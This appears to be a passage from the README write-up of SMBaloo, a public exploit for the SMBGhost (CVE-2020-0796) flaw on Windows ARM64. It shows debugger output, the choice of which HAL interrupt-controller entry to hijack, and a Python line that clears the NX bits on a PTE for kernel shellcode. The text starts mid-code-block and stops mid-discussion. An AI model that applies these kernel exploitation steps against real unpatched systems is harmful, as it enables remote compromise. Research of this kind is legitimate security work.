# SMBaloo
![alt text](images/logo.png)

A CVE-2020-0796 (aka "SMBGhost") exploit for Windows ARM64.

*Because vulnerabilities and exploits don't need to always have scary names and logos.*

* [**GitHub Repository**](https://www.github.com/msuiche/smbaloo): https://www.github.com/msuiche/smbaloo
* [**Original post on Comae's blog**](https://www.comae.com/posts/2020-07-01_smbaloo-building-a-rce-exploit-for-windows-arm64-smbghost-edition/): https://www.comae.com/posts/2020-07-01_smbaloo-building-a-rce-exploit-for-windows-arm64-smbghost-edition/
* **Author**: Matt Suiche ([@msuiche](https://www.twitter.com/msuiche))

# Acknowledgments
- [@hugeh0ge](https://twitter.com/hugeh0ge) for his great blogpost and [@chompie1337](https://twitter.com/chompie1337) for her excellent POC! On top of answering my questions on Twitter, their materials were really good and helped me immensely to understand the vulnerability and the exploitation part. Really HUGE kudos to both of them!
- ZecOps & Michael Maltsev  ([@m417z](https://twitter.com/m417z)) for their write-ups.
- Special thanks to Stephen Ridley ([@s7ephen](https://twitter.com/s7ephen)) for being the ultimate ARM64 enabler and a great Aniki. 
- Barnaby (RIP), I also gave a refresh to your APC injection technique. I hope you like it, we miss you.. Alex says hi.

fffff7f3`c0007008  fffff800`dfbd7370 hal!HalpRegisteredInterruptControllers
fffff7f3`c0007010  fffff7f3`c0007158
fffff7f3`c0007018  00000000`00000545
fffff7f3`c0007020  fffff800`df8c7640 hal!HalpGic3InitializeLocalUnit
fffff7f3`c0007028  fffff800`df8c7450 hal!HalpGic3InitializeIoUnit
fffff7f3`c0007030  fffff800`df89b2c0 hal!HalpGic3SetPriority
fffff7f3`c0007038  00000000`00000000
fffff7f3`c0007040  00000000`00000000
fffff7f3`c0007048  00000000`00000000
fffff7f3`c0007050  00000000`00000000
fffff7f3`c0007058  fffff800`df8c71a0 hal!HalpGic3AcceptAndGetSource
fffff7f3`c0007060  fffff800`df89b2e0 hal!HalpGic3WriteEndOfInterrupt
fffff7f3`c0007068  00000000`00000000
fffff7f3`c0007070  fffff800`df8c7ea0 hal!HalpGic3SetLineState
fffff7f3`c0007078  fffff800`df8c7d70 hal!HalpGic3RequestInterrupt
```

```bash
0: kd> !itoldyouso hal
hal.dll
    Timestamp: 4328224B
    SizeOfImage: 36F000
          pdb: hal.pdb
          pdb sig: 24BF0D45-4FA0-30FF-4791-CA91A5EAD872
          age: 1
0: kd> ? hal!HalpRegisteredInterruptControllers - hal
Evaluate expression: 3433328 = 00000000`00346370
```

More importantly, we need to decide which entry to patch to trigger our kernel payload. As you can see, instead of Advanced Programmable Interrupt Controller (APIC) - the ARM64 Operating System is using [Generic Interrupt Controller (GIC) version 3](http://bos.itdks.com/855dbb545f004e9da1c603f3bcc0a917.pdf).

The [GICv3 architecture](https://static.docs.arm.com/ihi0069/c/IHI0069C_gic_architecture_specification.pdf) is designed to operate with ARMv8-A and ARMv8-R compliant processing elements (PEs).

![GIC v3](images/gicv3.png)

The Generic Interrupt Controller (GIC) architecture defines:
- The architectural requirements for handling all interrupt sources for any PE connected to a GIC.
- A common interrupt controller programming interface applicable to uniprocessor or multiprocessor systems.

In the `SMBaloo` exploit, I decided to patch the `hal!HalpGic3RequestInterrupt` entry which would be the equivalent of `hal!HalpApicRequestInterrupt`.
# Shellcode
`KUSER_SHARED_DATA` is a popular option to copy and execute kernel payloads, although you do have to flip the NX bits before patching the Interrupt Controller table entry. We will explore this option before discussing a second option which I ended up using for `SMBaloo`.
### TTBR Self Ref?
#### TTBR Self Ref and NX bits
If we look at TTBR page table in Windbg, we will see that just like for the main PML4 page table, there is a self-reference entry which we can use for finding the virtual address of the `KUSER_SHARED_DATA` PTE.

The only notable difference with x64 systems is that the No Execute bitfield positions are different and exist as two separate values `PrivilegedNoExecute` (EL1 - Kernelland) and `UserNoExecute` (EL0 - Userland).
```python
    # Clear NX bit
    # This is different on ARM64
    # MMPTE_HARDWARE.PrivilegedNoExecute = False
    # MMPTE_HARDWARE.UserNoExecute = False
    overwrite_val = pte_val & ~(3 << 53)
```

```bash
0: kd> dt nt!_MMPTE_HARDWARE
   +0x000 Valid            : Pos 0, 1 Bit
   +0x000 NotLargePage     : Pos 1, 1 Bit
   +0x000 CacheType        : Pos 2, 2 Bits
   +0x000 OsAvailable2     : Pos 4, 1 Bit
   +0x000 NonSecure        : Pos 5, 1 Bit
   +0x000 Owner            : Pos 6, 1 Bit
   +0x000 NotDirty         : Pos 7, 1 Bit
   +0x000 Sharability      : Pos 8, 2 Bits
   +0x000 Accessed         : Pos 10, 1 Bit
   +0x000 NonGlobal        : Pos 11, 1 Bit
   +0x000 PageFrameNumber  : Pos 12, 36 Bits
   +0x000 reserved1        : Pos 48, 4 Bits
   +0x000 ContiguousBit    : Pos 52, 1 Bit
   +0x000 PrivilegedNoExecute : Pos 53, 1 Bit
   +0x000 UserNoExecute    : Pos 54, 1 Bit
   +0x000 Writable         : Pos 55, 1 Bit
   +0x000 CopyOnWrite      : Pos 56, 1 Bit
   +0x000 PdeLocked        : Pos 57, 1 Bit
   +0x000 PdeContended     : Pos 58, 1 Bit
   +0x000 PxnTable         : Pos 59, 1 Bit
   +0x000 UxnTable         : Pos 60, 1 Bit
   +0x000 ApTable          : Pos 61, 2 Bits
   +0x000 NsTable          : Pos 63, 1 Bit
```

But remember, we can't read physical page tables with our MDL-assisted physical page read :( I used this technique during my initial tests by hardcoding the PTE virtual address and PTE value until I found a more reliable technique which I cover in the next section.

### Why flipping bits? When you don't have to.
After thinking about it, I was asking myself why was I even trying to patch a PTE entry in the first place. I was getting tired of copy pasting the virtual address from the debugger into my exploit which really started to feel silly after a while. All we need is an executable page, right?

